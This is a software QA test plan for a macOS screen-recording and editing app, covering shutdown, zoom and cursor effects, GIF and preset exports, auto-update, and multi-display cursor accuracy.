## TC-040: App Quit — Clean Shutdown During Recording
**Type:** Manual
**Priority:** P0
**Preconditions:**
- Recording is currently in progress

**Steps:**
1. While recording is active, press Cmd+Q or File > Quit
2. Observe the quit confirmation dialog (if implemented)
3. Confirm quit

**Expected Result:**
- App shows a confirmation dialog: "Recording in progress. Quitting will stop the recording. Continue?"
- If user confirms: recording stops, session is saved to a recoverable state, app quits
- If user cancels: recording continues, app remains open
- All child processes (capture, cursor-tracker, audio-composer) are terminated cleanly
- No zombie processes remain after app quits (verify with `ps aux | grep capture`)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** If app quits without cleanup, Swift helper processes may continue running. This is a P0 bug.

---

## Phase 2 — Effects Test Cases

---

## TC-041: Zoom/Pan — ZoomPathGenerator Unit Test (Happy Path)
**Type:** Unit
**Priority:** P0
**Preconditions:**
- `ZoomPathGenerator.ts` implemented
- Test cursor log fixture available

**Steps:**
1. Load a fixture cursor log with: 10 seconds of movement, 3 clicks (at t=2s, t=5s, t=8s), pauses of 1+ second around each click
2. Call `ZoomPathGenerator.generate(cursorLog, duration: 10)`
3. Inspect the returned `ZoomEvent[]` array

**Expected Result:**
- Returns at least 3 zoom events (one per click region of interest)
- Each zoom event has `startTime < endTime`
- `zoomLevel` is between 1.5 and 3.0 for click events
- `centerX` and `centerY` are in range [0.0, 1.0]
- `easing` is either `'spring'` or `'ease-in-out'`
- Zoom events do not overlap in time
- At the end of each zoom event, zoom level returns to 1.0 (no permanent zoom)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with cursor log that has no pauses (no zoom events expected) and cursor log with many clicks.

---

## TC-042: Zoom/Pan — Spring Physics Convergence (Unit)
**Type:** Unit
**Priority:** P0
**Preconditions:**
- `SpringSimulator.ts` implemented with exported `springStep` function

**Steps:**
1. Initialize: `current = 0.0`, `target = 1.0`, `velocity = 0.0`, `dt = 0.016` (60fps)
2. Run `springStep` in a loop for 200 iterations (k=200, b=28)
3. Record the position at each step
4. Check convergence

**Expected Result:**
- Position moves from 0.0 toward 1.0
- Overshoots target by no more than 0.1 (10% overshoot — cinematic feel)
- Settles within ±0.001 of target by iteration 100 (< 1.67 seconds at 60fps)
- Does not oscillate indefinitely (critically-damped or slightly underdamped behavior)
- No NaN or Infinity values produced under any dt value from 0.001 to 0.1

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** These are the "magic numbers" from Screen Studio (k=200, b=28). If they change, document why.

---

## TC-043: Zoom/Pan — Cursor Smoother Accuracy (Unit)
**Type:** Unit
**Priority:** P1
**Preconditions:**
- `CursorSmoother.ts` implemented

**Steps:**
1. Feed `CursorSmoother` with alternating positions: (100,100), (200,200), (100,100) ... (10 samples)
2. Record smoothed output
3. Feed with a linear ramp: (0,0), (10,10), (20,20), ... (100,100)
4. Record smoothed output

**Expected Result:**
- Alternating input: output is approximately (150, 150) after initial window fills — jitter removed
- Linear ramp: output follows the ramp with a lag of approximately `windowSize/2` frames
- Smoothed values are never outside the range of [min(input), max(input)]
- Window size of 5 samples produces reasonable smoothing without excessive lag
- No NaN values produced for any finite input

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with window sizes 1, 5, and 10. Window size 1 should produce output equal to input.

---

## TC-044: Cursor Effects — Highlight Render Position Accuracy
**Type:** E2E / Manual
**Priority:** P0
**Preconditions:**
- Phase 2 editor with cursor effects enabled
- A recording with known cursor positions available

**Steps:**
1. Open a recording where cursor was in the center of the screen throughout
2. Enable cursor highlight in CursorPanel
3. Play the recording in preview
4. Pause at a frame where cursor should be at center (e.g., t=5s)
5. Visually verify cursor highlight position

**Expected Result:**
- Cursor highlight circle is centered on the cursor position in the video
- Position accuracy within 2 pixels of actual cursor position (accounting for smoothing)
- Highlight is always visible (opacity > 0.3) during playback
- Highlight follows cursor smoothly (no teleportation artifacts)
- Cursor rendering does not exceed the video frame boundaries

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Requires a recording fixture with known cursor positions for automated verification.

---

## TC-045: Cursor Effects — Click Ripple Animation
**Type:** E2E / Manual
**Priority:** P1
**Preconditions:**
- Editor with cursor effects enabled
- Recording that includes a left click event at a known timestamp

**Steps:**
1. Load recording with a click at t=3.000s
2. Enable cursor effects (ripple enabled)
3. Play from t=2.8s
4. Observe the click animation at t=3.0s

**Expected Result:**
- At t=3.0s, a ripple/ring animation expands outward from click position
- Animation begins within 1 frame (16ms) of the click timestamp
- Animation completes within 300ms (scale from 0 to 2x, opacity from 1 to 0)
- Ripple is visually distinct from the cursor highlight
- Multiple clicks in quick succession each trigger their own ripple (no dropping)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with right-click as well — ripple should have distinct color or style.

---

## TC-046: Cursor Effects — Cursor Desync Detection
**Type:** Integration / Manual
**Priority:** P0
**Preconditions:**
- Recording with known cursor events (timestamps from `cursor.json`)
- Video with known frame timestamps from ffprobe

**Steps:**
1. Load a 30-second recording
2. Using ffprobe, extract the PTS of frame N at t=10.0s
3. Find the cursor event from `cursor.json` nearest to t=10.0s
4. During export, check that the cursor overlay at t=10.0s uses the correct cursor position

**Expected Result:**
- Cursor position in exported video at t=10.0s matches the `cursor.json` entry at the closest timestamp
- Offset between cursor timestamp and video frame PTS is within ±1 frame (±16.7ms at 60fps)
- Desync does NOT accumulate over time (30-second recording has same accuracy as 10-second)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** This requires careful timestamp calibration between `mach_absolute_time()` and CMSampleBuffer PTS.

---

## TC-047: Background — Frosted Glass Blur Export Quality
**Type:** Manual
**Priority:** P1
**Preconditions:**
- A recording with blur background configured
- Export to MP4 completed

**Steps:**
1. Configure blur background with radius 40
2. Export 5-second clip to MP4 1080p
3. Open exported video in QuickTime
4. Pause on first frame and inspect background quality

**Expected Result:**
- Background shows a clearly blurred version of the source screenshot
- No visible compression artifacts in the blur area
- Blur is consistent across the entire background (no unblurred areas)
- Blur in the export matches what is shown in the preview canvas
- No visible seams between the blur background and the video content overlay

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Compare preview canvas screenshot with exported frame using a pixel comparison tool.

---

## TC-048: Keyboard Shortcut Overlay — Display and Positioning
**Type:** Manual
**Priority:** P1
**Preconditions:**
- Phase 2 keyboard overlay implemented
- Overlay window set to `alwaysOnTop: true`

**Steps:**
1. Enable keyboard shortcut overlay in settings
2. Press Cmd+C during recording
3. Observe the overlay window position and appearance
4. Press multiple keys in quick succession

**Expected Result:**
- Keystroke badge appears within 50ms of key press
- Badge shows the correct key combination (e.g., "⌘C")
- Badge is positioned consistently (e.g., bottom-left of screen, above the dock)
- Badge fades out after approximately 2 seconds
- Multiple keystrokes stack vertically or queue correctly
- Overlay does not interfere with the recording content

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Overlay must NOT capture the keyboard events itself (to avoid intercepting system shortcuts).

---

## TC-049: Zoom Renderer — Metal Shader Output Validation
**Type:** Integration
**Priority:** P0
**Preconditions:**
- zoom-renderer binary compiled with Metal shaders
- Test input video and zoom event JSON available

**Steps:**
1. Run: `./zoom-renderer --input capture.mov --events zoom_events.json --output zoomed.mov`
2. Check exit code
3. Run ffprobe on `zoomed.mov`
4. Compare a specific frame at zoom event center using image comparison

**Expected Result:**
- Binary exits with code 0
- Output file is valid video
- Duration matches input
- At the timestamp of a 2x zoom event, the center region of the frame is enlarged correctly
- Bicubic sampling produces smooth (not pixelated) zoom result
- Output file is lossless HEVC (or matches the configured format)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Use ImageMagick `compare` or a pixel diff tool to validate zoom accuracy.

---

## TC-050: Device Frame — SVG Frame Overlay in Preview
**Type:** E2E / Manual
**Priority:** P2
**Preconditions:**
- Phase 2 device frames implemented
- MacBook bezel SVG available in `src/renderer/assets/frames/`

**Steps:**
1. Open editor with a recording
2. Select "MacBook Pro" device frame from the device frame selector
3. Observe canvas preview

**Expected Result:**
- MacBook bezel SVG renders above the video layer
- Video content is visible through the screen area of the SVG frame
- Frame scales correctly with the canvas dimensions
- Removing the frame returns to no-frame state cleanly

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** P2 — lower priority but important for product completeness.

---

## Phase 3 — Polish Test Cases

---

## TC-081: Timeline — Trim Handle Drag Accuracy
**Type:** E2E / Manual
**Priority:** P0
**Preconditions:**
- Phase 3 Timeline component implemented
- A 60-second recording loaded in editor

**Steps:**
1. Open timeline view
2. Drag the in-point trim handle to approximately the 10-second mark
3. Drag the out-point trim handle to approximately the 50-second mark
4. Export the trimmed clip

**Expected Result:**
- In-point snaps to within 1 frame of the drag target
- Out-point snaps to within 1 frame of the drag target
- Duration display shows approximately 40 seconds
- Exported MP4 duration is 40 seconds ± 0.1 seconds
- Frames before the in-point and after the out-point are not present in the export

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test trim accuracy at sub-second precision (e.g., 0.5-second increments).

---

## TC-082: Timeline — Playhead Scrubbing
**Type:** E2E / Manual
**Priority:** P1
**Preconditions:**
- Timeline and video playback implemented

**Steps:**
1. Click and drag the playhead to the 30-second mark on a 60-second clip
2. Observe the preview canvas
3. Drag playhead rapidly left and right

**Expected Result:**
- Preview canvas updates to show the correct frame at the playhead position
- Frame update happens within 100ms of playhead position change
- Rapid scrubbing does not cause crashes or memory issues
- Playhead position is accurate to within ±1 frame

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with a resource-intensive recording (4K, 60fps).

---

## TC-083: Timeline — Zoom Event Track Visualization
**Type:** E2E / Manual
**Priority:** P1
**Preconditions:**
- ZoomPathGenerator has generated zoom events for the loaded clip
- ZoomEventTrack component renders in timeline

**Steps:**
1. Open timeline view on a clip with 3 zoom events
2. Observe the zoom event track above the main timeline

**Expected Result:**
- 3 colored blocks appear on the zoom event track at the correct time positions
- Each block width corresponds to the zoom event duration
- Hovering a block shows zoom level info (tooltip)
- Clicking a zoom event block selects it for editing

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Block colors should indicate zoom level intensity.

---

## TC-084: GIF Export — Palette Generation Quality
**Type:** Integration / Manual
**Priority:** P0
**Preconditions:**
- Phase 3 GIF export pipeline implemented
- A 10-second clip with rich colors available

**Steps:**
1. Export a 10-second, 800px wide clip as GIF at 12fps
2. Inspect the palette PNG intermediate file
3. Inspect the final GIF file

**Expected Result:**
- `palette.png` is a valid PNG with 256 colors (ffprobe or ImageMagick `identify`)
- Final `output.gif` opens correctly in Preview
- Colors in GIF are reasonably accurate (not severely posterized)
- File size is under 5MB for a 10-second 800px clip
- Frame count = 10 seconds * 12fps = 120 frames (±1)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Use gifsicle's `--info` flag to verify frame count and loop count.

---

## TC-085: GIF Export — gifsicle Optimization
**Type:** Integration
**Priority:** P1
**Preconditions:**
- GIF export pipeline runs gifsicle after ffmpeg

**Steps:**
1. Export same 10-second clip as GIF
2. Compare file size before and after gifsicle `--optimize=3`
3. Verify the optimized GIF still plays correctly

**Expected Result:**
- Optimized GIF is at least 10% smaller than unoptimized
- Optimized GIF plays identically to unoptimized version (same frames, same timing)
- gifsicle exits with code 0 (no optimization errors)
- If gifsicle binary is missing, export fails with a clear error (not silently)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Log intermediate file sizes during the export pipeline for regression tracking.

---

## TC-086: Webcam — Overlay Positioning in Export
**Type:** Integration / Manual
**Priority:** P1
**Preconditions:**
- Phase 3 webcam overlay implemented
- A 10-second clip with webcam enabled available

**Steps:**
1. Record with webcam overlay enabled (bottom-right corner, 320x240)
2. Export to MP4
3. Open exported MP4 and inspect the bottom-right corner

**Expected Result:**
- Webcam overlay is present in the bottom-right corner (W-320-20 from right, H-240-20 from bottom)
- Overlay size is 320x240 pixels
- Webcam video is synchronized with screen recording (no desync)
- Overlay has circular mask (if implemented) and shadow effect
- No green screen artifacts or black frames in webcam overlay

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with face detection disabled first, then enabled.

---

## TC-087: Export Presets — All Social Media Presets
**Type:** Integration
**Priority:** P0
**Preconditions:**
- Phase 3 export presets implemented
- A 30-second recording available

**Steps:**
1. For each preset (Twitter/X, YouTube, LinkedIn, Slack/Discord GIF):
   a. Select the preset in ExportModal
   b. Verify displayed settings match expected values
   c. Export the clip
   d. Run ffprobe on output and verify dimensions, fps, format

**Expected Result:**
| Preset | Width | Height | FPS | Format |
|--------|-------|--------|-----|--------|
| Twitter/X | 1280 | 720 | 30 | mp4 |
| YouTube | 1920 | 1080 | 60 | mp4 |
| LinkedIn | 1280 | 720 | 30 | mp4 |
| Slack/Discord | 800 | 450 | 24 | gif |
- All exports complete without errors
- ffprobe confirms each file matches the expected dimensions, fps, and format

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** LinkedIn and Twitter have different encoding requirements — verify bitrates are appropriate.

---

## TC-088: Auto-Update — Update Detection
**Type:** Integration / Manual
**Priority:** P1
**Preconditions:**
- electron-updater configured with a test GitHub Releases channel
- A newer version published to the test channel

**Steps:**
1. Launch an older version of the app (version N)
2. Wait for auto-update check (or trigger manually via menu)
3. Observe update notification

**Expected Result:**
- App detects that a newer version (N+1) is available within 30 seconds of launch
- User sees a notification: "A new version is available. Download and install?"
- Update downloads in the background with progress shown
- After download, user is prompted to restart and install
- New version is installed correctly and launches successfully

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with an intentionally broken update package to verify error handling.

---

## TC-089: Audio — Waveform Rendering in Timeline
**Type:** E2E / Manual
**Priority:** P1
**Preconditions:**
- Phase 3 Timeline with AudioWaveform component implemented
- Recording with audio available

**Steps:**
1. Load a recording with clear audio (speech or music)
2. Open the timeline view
3. Observe the AudioWaveform component

**Expected Result:**
- Waveform renders as a visual amplitude graph spanning the full clip duration
- Waveform accurately represents loud vs. quiet sections
- Waveform updates if trim handles change (reflects only the trimmed section)
- Waveform rendering does not block the UI thread (renders asynchronously via Web Audio API)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with silence (all zeros — flat waveform expected) and clipped audio (check visual clipping indicator).

---

## TC-090: Full Regression — End-to-End Smoke Test (Phase 3)
**Type:** E2E / Manual
**Priority:** P0
**Preconditions:**
- Phase 3 build complete
- All Phase 1 and Phase 2 exit criteria previously met

**Steps:**
1. Launch app fresh
2. Start a 30-second recording with: microphone enabled, cursor tracking enabled
3. During recording: type some text, perform 3 clicks, pause cursor for 2 seconds at each click
4. Stop recording
5. In editor: apply gradient background, padding 40, enable zoom effects, enable cursor highlight
6. Trim to 10-25 seconds (middle section)
7. Add webcam overlay (if available)
8. Export as YouTube preset (1920x1080 MP4 60fps)
9. Export as Slack/Discord GIF (800x450)
10. Save project as `.screenstudio` bundle
11. Close editor
12. Reopen the saved project
13. Verify all settings are restored

**Expected Result:**
- All steps complete without errors or crashes
- Both exports are valid, playable files with correct specs (verified via ffprobe)
- Zoom animations are visible in the MP4 export
- Cursor highlight follows the cursor throughout the clip
- GIF loops correctly and has acceptable quality
- Project reopens with identical settings to when it was saved

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** This is the release-gate smoke test. Must pass before any Phase 3 release.

---

## Multi-Display Test Cases (Sprint 20)

Cursor coordinate correctness (US-159/160) and the display layout picker (US-161)
cannot be verified by CI — they require real multi-monitor hardware. These must
be run manually before any release that touches recording, cursor tracking, or
zoom generation.

---

## TC-091: Multi-Display — Two Displays Side by Side, Record Main
**Type:** Manual
**Priority:** P0
**Preconditions:**
- Two displays connected, arranged side by side in System Settings > Displays (no vertical offset)
- Main display is NOT positioned at the leftmost point (i.e. the secondary display has origin.x < 0, or main is on the right)

**Steps:**
1. Open the display picker — confirm `DisplayLayoutPicker` renders both displays in the correct relative left/right position
2. Select the main display, start recording
3. Move the cursor around the main display, click a few times, then briefly move the cursor onto the secondary display and back
4. Stop recording, open the editor
5. Scrub through the timeline, observe cursor highlight / synthetic cursor position (if cursor-less capture) and any auto-generated zoom events

**Expected Result:**
- Display picker shows displays in their real relative position, not just a flat list
- Cursor highlight/synthetic cursor tracks the actual on-screen cursor position accurately for the whole recording — no offset, no drift to one side
- No zoom event jumps to a nonsensical position corresponding to time spent on the secondary display (those cursor samples should be dropped, not misplaced)

**Actual Result:** [to be filled during test run]
**Status:** Not Run

---

## TC-092: Multi-Display — Secondary Display Positioned to the Left (Negative Origin)
**Type:** Manual
**Priority:** P0
**Preconditions:**
- Two displays, secondary display dragged to the left of main in System Settings > Displays

**Steps:**
1. Record the **secondary** (non-main) display
2. Move the cursor across the full secondary display during recording, including near its edges
3. Stop, open editor, check cursor overlay position throughout

**Expected Result:**
- Cursor position is accurate across the entire recorded frame, including near edges — this is the exact scenario the Sprint 20 fix targets (negative global origin subtracted correctly)

**Actual Result:** [to be filled during test run]
**Status:** Not Run

---

## TC-093: Multi-Display — Retina Main Display, Cursor Coordinate Scale
**Type:** Manual
**Priority:** P0
**Preconditions:**
- Recording on a Retina (HiDPI) display

**Steps:**
1. Record the Retina main display at native/full resolution (no `maxHeight` cap, or a cap that still leaves a non-1:1 points-to-pixels ratio)
2. Click precisely on a small on-screen UI element (e.g. a menu bar icon) during recording
3. Stop, check that the click ripple / cursor highlight in the editor lands exactly on that element, not offset to one quadrant of the frame

**Expected Result:**
- Cursor position matches the clicked element precisely — this catches a regression of the points-vs-pixels scale bug (cursor pinned to top-left quadrant is the symptom if this regresses)

**Actual Result:** [to be filled during test run]
**Status:** Not Run

---

## TC-094: Multi-Display — Different Resolutions Per Display
**Type:** Manual
**Priority:** P1
**Preconditions:**
- Two displays with different native resolutions and/or different scale factors (e.g. one Retina, one not)

**Steps:**
1. Record each display in turn (separate recordings)
2. Verify cursor tracking accuracy on each

**Expected Result:**
- Cursor coordinate correctness does not depend on which display (or its resolution/scale) is being recorded — each recording's `pointsToPixels`/origin is computed independently per the Sprint 20 fix

**Actual Result:** [to be filled during test run]
**Status:** Not Run

---

## TC-095: Multi-Display — Ultrawide / Vertical Monitor Aspect Warning
**Type:** Manual
**Priority:** P2
**Preconditions:**
- An ultrawide (21:9 or wider) or vertically-rotated monitor available; if unavailable, this can be spot-checked by temporarily setting a display's rotation to portrait in System Settings

**Steps:**
1. Select the ultrawide/vertical display in the display picker
2. Observe the recording controls area below the picker

**Expected Result:**
- A warning appears suggesting a non-16:9 export aspect ratio matches this display's actual shape (US-163)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** US-162 (switching the recorded display mid-recording) was spiked but not shipped this sprint — see SPRINT_20.md notes. No test case for it yet; add one if/when implemented.
